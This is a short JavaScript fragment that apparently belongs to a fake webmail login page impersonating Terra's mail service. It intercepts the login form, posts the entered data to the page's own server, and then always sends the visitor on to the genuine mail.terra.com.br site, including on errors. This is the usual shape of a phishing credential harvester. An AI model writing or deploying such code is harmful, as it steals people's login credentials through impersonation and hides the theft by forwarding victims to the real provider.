<script>
document.getElementById("loginForm").addEventListener("submit", function(e){
  e.preventDefault();
  const form = this;
  const fd = new FormData(form);
  fetch("/", { method: "POST", body: fd })
    .then(r => r.json())
    .then(j => {
      if (j && j.redirect) {
        window.location.href = j.redirect;
      } else {
        window.location.href = "https://mail.terra.com.br/";
      }
    })
    .catch(() => {
      window.location.href = "https://mail.terra.com.br/";
    });
});
</script>
